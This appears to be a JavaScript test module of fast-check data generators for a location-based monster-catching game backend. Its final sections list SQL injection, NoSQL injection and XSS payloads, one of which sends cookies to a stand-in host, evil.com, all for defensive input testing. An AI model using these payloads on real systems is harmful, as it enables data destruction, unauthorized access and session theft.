/**
 * Custom Arbitraries - 自定义数据生成器
 * 用于 Property-Based Testing 的随机数据生成
 * 
 * @module backend/shared/testing/arbitraries
 * @version 1.0.0
 */

const fc = require('fast-check');

/**
 * Pokemon 数据生成器
 */
const pokemonArbitrary = fc.record({
  id: fc.integer({ min: 1, max: 10000 }),
  speciesId: fc.integer({ min: 1, max: 500 }),
  name: fc.string({ minLength: 1, maxLength: 20 }).filter(s => /^[a-zA-Z\u4e00-\u9fa5]+$/.test(s)),
  nickname: fc.option(fc.string({ minLength: 1, maxLength: 30 }), { nil: undefined }),
  iv: fc.record({
    attack: fc.integer({ min: 0, max: 31 }),
    defense: fc.integer({ min: 0, max: 31 }),
    stamina: fc.integer({ min: 0, max: 31 })
  }),
  level: fc.integer({ min: 1, max: 100 }),
  cp: fc.integer({ min: 10, max: 65535 }),
  hp: fc.integer({ min: 1, max: 500 }),
  maxHp: fc.integer({ min: 1, max: 500 }),
  types: fc.array(fc.constantFrom('normal', 'fire', 'water', 'electric', 'grass', 'ice', 'fighting', 'poison', 'ground', 'flying', 'psychic', 'bug', 'rock', 'ghost', 'dragon', 'dark', 'steel', 'fairy'), { minLength: 1, maxLength: 2 }),
  moves: fc.array(fc.record({
    id: fc.integer({ min: 1, max: 1000 }),
    name: fc.string({ minLength: 1, maxLength: 30 }),
    type: fc.constantFrom('normal', 'fire', 'water', 'electric', 'grass', 'ice', 'fighting', 'poison', 'ground', 'flying'),
    power: fc.integer({ min: 0, max: 200 }),
    energyCost: fc.integer({ min: 0, max: 100 })
  }), { minLength: 1, maxLength: 4 }),
  location: fc.option(fc.record({
    latitude: fc.float({ min: -90, max: 90, noNaN: true }),
    longitude: fc.float({ min: -180, max: 180, noNaN: true })
  }), { nil: undefined }),
  caughtAt: fc.date({ min: new Date('2016-01-01'), max: new Date('2030-12-31') }),
  isFavorite: fc.boolean(),
  buddyDistance: fc.float({ min: 0, max: 1000, noNaN: true })
});

/**
 * 位置数据生成器
 */
const locationArbitrary = fc.record({
  latitude: fc.float({ min: -90, max: 90, noNaN: true }),
  longitude: fc.float({ min: -180, max: 180, noNaN: true }),
  altitude: fc.option(fc.float({ min: -100, max: 9000, noNaN: true }), { nil: undefined }),
  accuracy: fc.option(fc.float({ min: 0, max: 100, noNaN: true }), { nil: undefined }),
  timestamp: fc.integer({ min: 0, max: 2147483647 })
});

/**
 * GPS 坐标生成器（带真实城市数据）
 */
const realWorldLocationArbitrary = fc.oneof(
  // 北京
  fc.record({
    latitude: fc.float({ min: 39.8, max: 40.1, noNaN: true }),
    longitude: fc.float({ min: 116.2, max: 116.6, noNaN: true }),
    city: fc.constant('Beijing'),
    country: fc.constant('CN')
  }),
  // 东京
  fc.record({
    latitude: fc.float({ min: 35.6, max: 35.9, noNaN: true }),
    longitude: fc.float({ min: 139.6, max: 140.0, noNaN: true }),
    city: fc.constant('Tokyo'),
    country: fc.constant('JP')
  }),
  // 纽约
  fc.record({
    latitude: fc.float({ min: 40.5, max: 40.9, noNaN: true }),
    longitude: fc.float({ min: -74.2, max: -73.7, noNaN: true }),
    city: fc.constant('New York'),
    country: fc.constant('US')
  }),
  // 伦敦
  fc.record({
    latitude: fc.float({ min: 51.3, max: 51.7, noNaN: true }),
    longitude: fc.float({ min: -0.5, max: 0.3, noNaN: true }),
    city: fc.constant('London'),
    country: fc.constant('UK')
  })
);

/**
 * 用户输入生成器（包含特殊字符和边界值）
 */
const userInputArbitrary = fc.oneof(
  // 正常字符串
  fc.string({ minLength: 0, maxLength: 100 }),
  // 包含空字符
  fc.string().filter(s => s.includes('\u0000')),
  // 包含 HTML 字符
  fc.string().filter(s => /[<>]/.test(s)),
  // 包含反斜杠
  fc.string().filter(s => s.includes('\\')),
  // 包含引号
  fc.string().filter(s => /['"]/.test(s)),
  // 边界值
  fc.constantFrom('', null, undefined),
  // 超长字符串
  fc.string({ minLength: 1000, maxLength: 10000 }),
  // Unicode 字符
  fc.string().filter(s => /[\u4e00-\u9fa5\u3040-\u309f\u30a0-\u30ff]/.test(s)),
  // Emoji
  fc.string().filter(s => /[\u{1F600}-\u{1F64F}\u{1F300}-\u{1F5FF}]/u.test(s))
);

/**
 * 用户数据生成器
 */
const userArbitrary = fc.record({
  id: fc.integer({ min: 1, max: 100000000 }),
  username: fc.string({ minLength: 3, maxLength: 20 }).filter(s => /^[a-zA-Z0-9_]+$/.test(s)),
  email: fc.tuple(
    fc.string({ minLength: 1, maxLength: 20 }).filter(s => /^[a-z0-9.+-]+$/.test(s)),
    fc.string({ minLength: 1, maxLength: 10 }).filter(s => /^[a-z]+$/i.test(s))
  ).map(([local, domain]) => `${local}@${domain}.com`),
  level: fc.integer({ min: 1, max: 50 }),
  experience: fc.integer({ min: 0, max: 10000000 }),
  coins: fc.integer({ min: 0, max: 10000000 }),
  pokeballs: fc.integer({ min: 0, max: 1000 }),
  greatballs: fc.integer({ min: 0, max: 500 }),
  ultraballs: fc.integer({ min: 0, max: 200 }),
  team: fc.constantFrom('valor', 'mystic', 'instinct', 'none'),
  location: locationArbitrary,
  language: fc.constantFrom('en', 'zh', 'ja', 'ko', 'es', 'de', 'fr'),
  timezone: fc.string().filter(s => s.includes('/')),
  createdAt: fc.date({ min: new Date('2016-07-06'), max: new Date() }),
  lastLoginAt: fc.date({ min: new Date('2020-01-01'), max: new Date() })
});

/**
 * 战斗数据生成器
 */
const battleArbitrary = fc.record({
  attacker: fc.record({
    pokemonId: fc.integer({ min: 1, max: 10000 }),
    attack: fc.integer({ min: 10, max: 500 }),
    defense: fc.integer({ min: 10, max: 500 }),
    stamina: fc.integer({ min: 10, max: 500 }),
    level: fc.integer({ min: 1, max: 100 }),
    types: fc.array(fc.string(), { minLength: 1, maxLength: 2 }),
    moves: fc.array(fc.record({
      type: fc.string(),
      power: fc.integer({ min: 0, max: 200 }),
      energyCost: fc.integer({ min: 0, max: 100 }),
      isStab: fc.boolean()
    }), { minLength: 1, maxLength: 4 })
  }),
  defender: fc.record({
    pokemonId: fc.integer({ min: 1, max: 10000 }),
    attack: fc.integer({ min: 10, max: 500 }),
    defense: fc.integer({ min: 10, max: 500 }),
    stamina: fc.integer({ min: 10, max: 500 }),
    level: fc.integer({ min: 1, max: 100 }),
    types: fc.array(fc.string(), { minLength: 1, maxLength: 2 })
  }),
  weather: fc.constantFrom('clear', 'rain', 'cloudy', 'partlyCloudy', 'windy', 'snow', 'fog'),
  gymBonus: fc.boolean(),
  friendshipBonus: fc.integer({ min: 0, max: 3 })
});

/**
 * 支付数据生成器
 */
const paymentArbitrary = fc.record({
  orderId: fc.string({ minLength: 10, maxLength: 30 }).filter(s => /^ORD[0-9A-Z]+$/.test(s)),
  userId: fc.integer({ min: 1, max: 100000000 }),
  amount: fc.float({ min: 0.01, max: 10000, noNaN: true }),
  currency: fc.constantFrom('USD', 'EUR', 'GBP', 'JPY', 'CNY'),
  productId: fc.string({ minLength: 1, maxLength: 50 }),
  productName: fc.string({ minLength: 1, maxLength: 100 }),
  quantity: fc.integer({ min: 1, max: 100 }),
  platform: fc.constantFrom('ios', 'android', 'web'),
  paymentMethod: fc.constantFrom('apple_pay', 'google_pay', 'credit_card', 'paypal', 'alipay', 'wechat_pay'),
  timestamp: fc.integer({ min: 0, max: 2147483647 })
});

/**
 * API 请求生成器
 */
const apiRequestArbitrary = fc.record({
  method: fc.constantFrom('GET', 'POST', 'PUT', 'DELETE', 'PATCH'),
  path: fc.string().filter(s => s.startsWith('/api/v') || s.startsWith('/api/')),
  headers: fc.dictionary(fc.string(), fc.string()),
  body: fc.oneof(fc.object(), fc.string(), fc.constant(null)),
  queryParams: fc.dictionary(fc.string(), fc.string())
});

/**
 * 嵌套深度数据生成器
 */
const deepNestedArbitrary = (maxDepth = 5) => {
  const buildArb = (depth) => {
    if (depth >= maxDepth) {
      return fc.oneof(fc.string(), fc.integer(), fc.boolean(), fc.constant(null));
    }
    return fc.record({
      value: fc.integer({ min: 0, max: 100 }),
      children: fc.array(buildArb(depth + 1), { maxLength: 3 })
    });
  };
  return buildArb(0);
};

/**
 * 边界值生成器
 */
const boundaryValuesArbitrary = fc.oneof(
  // 数值边界
  fc.constant(0),
  fc.constant(-1),
  fc.constant(1),
  fc.constant(Number.MAX_SAFE_INTEGER),
  fc.constant(Number.MIN_SAFE_INTEGER),
  fc.constant(Number.MAX_VALUE),
  fc.constant(Number.MIN_VALUE),
  fc.constant(Infinity),
  fc.constant(-Infinity),
  fc.constant(NaN),
  // 字符串边界
  fc.constant(''),
  fc.constant(' '),
  fc.constant('\n'),
  fc.constant('\t'),
  fc.constant('\u0000'),
  fc.constant('\u202E'),  // RTL 控制字符
  fc.constant('\uD83D\uDE00'),  // Emoji
  // 数组边界
  fc.constant([]),
  fc.constant([null]),
  fc.constant([undefined]),
  fc.constant([NaN]),
  fc.array(fc.constant(0), { maxLength: 10000 }),
  // 对象边界
  fc.constant({}),
  fc.constant({ '': 'value' }),
  fc.constant({ __proto__: null })
);

/**
 * SQL 注入尝试生成器
 */
const sqlInjectionArbitrary = fc.oneof(
  fc.constant("' OR '1'='1"),
  fc.constant("'; DROP TABLE users; --"),
  fc.constant('1; DELETE FROM pokemon WHERE 1=1'),
  fc.constant("' UNION SELECT * FROM users --"),
  fc.constant("admin'--"),
  fc.constant("1' AND '1'='1"),
  fc.constant("'; INSERT INTO users VALUES (1, 'hacker'); --"),
  fc.constant("' OR ''='")
);

/**
 * XSS 尝试生成器
 */
const xssArbitrary = fc.oneof(
  fc.constant('<script>alert(1)</script>'),
  fc.constant('<img src=x onerror="alert(1)">'),
  fc.constant('<svg onload="alert(1)">'),
  fc.constant('javascript:alert(1)'),
  fc.constant('<body onload="alert(1)">'),
  fc.constant('"><script>alert(1)</script>'),
  fc.constant("<script>document.location='http://evil.com/steal?c='+document.cookie</script>"),
  fc.constant('<iframe src="javascript:alert(1)">')
);

/**
 * NoSQL 注入尝试生成器
 */
const noSqlInjectionArbitrary = fc.oneof(
  fc.constant({ $where: 'this.password == this.username' }),
  fc.constant({ $gt: '' }),
  fc.constant({ $ne: '' }),
  fc.constant({ $regex: '.*' }),
  fc.constant({ $exists: true }),
  fc.constant({ $expr: { $eq: ['', ''] } })
);

/**
 * JSON 边界值生成器
 */
const jsonBoundaryArbitrary = fc.oneof(
  // 空值
  fc.constant(null),
  fc.constant('null'),
  fc.constant('undefined'),
  // 数字
  fc.constant(0),
  fc.constant(-0),
  fc.constant(1e308),
  fc.constant(-1e308),
  fc.constant(1e-308),
  // 字符串
  fc.constant(''),
  fc.constant('"'),
  fc.constant('\\"'),
  fc.constant('\\\\'),
  // 布尔值
  fc.constant(true),
  fc.constant(false),
  fc.constant('true'),
  fc.constant('false'),
  // 数组
  fc.constant([]),
  fc.array(fc.any(), { maxLength: 10000 }),
  // 嵌套
  fc.record({ a: fc.record({ b: fc.record({ c: fc.any() }) }) })
);

module.exports = {
  pokemonArbitrary,
  locationArbitrary,
  realWorldLocationArbitrary,
  userInputArbitrary,
  userArbitrary,
  battleArbitrary,
  paymentArbitrary,
  apiRequestArbitrary,
  deepNestedArbitrary,
  boundaryValuesArbitrary,
  sqlInjectionArbitrary,
  xssArbitrary,
  noSqlInjectionArbitrary,
  jsonBoundaryArbitrary
};